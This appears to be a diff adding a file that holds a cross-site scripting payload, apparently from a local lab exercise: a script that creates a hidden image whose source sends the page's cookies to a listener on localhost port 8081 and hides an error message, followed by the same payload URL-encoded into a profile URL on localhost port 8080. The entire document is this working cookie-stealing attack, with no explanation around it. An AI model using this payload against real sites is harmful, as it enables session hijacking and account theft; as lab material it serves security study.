@@ -1,0 +1,3 @@
+//<script> malicious_img = document.createElement("img"); malicious_img.setAttribute( "src", "http://localhost:8081/xss_out?stolen_cookie=" + document.cookie); malicious_img.style.visibility = "hidden"; document.getElementsByClassName("error")[0].style="display: none;";</script>
+
+http://localhost:8080/profile/%3Cscript%3E%20malicious_img%20%3D%20document.createElement%28%22img%22%29%3B%20malicious_img.setAttribute%28%20%22src%22%2C%20%22http%3A%2F%2Flocalhost%3A8081%2Fxss_out%3Fstolen_cookie%3D%22%20%2B%20document.cookie%29%3B%20malicious_img.style.visibility%20%3D%20%22hidden%22%3B%20document.getElementsByClassName%28%22error%22%29%5B0%5D.style%3D%22display%3A%20none%3B%22%3B%3C%2Fscript%3E
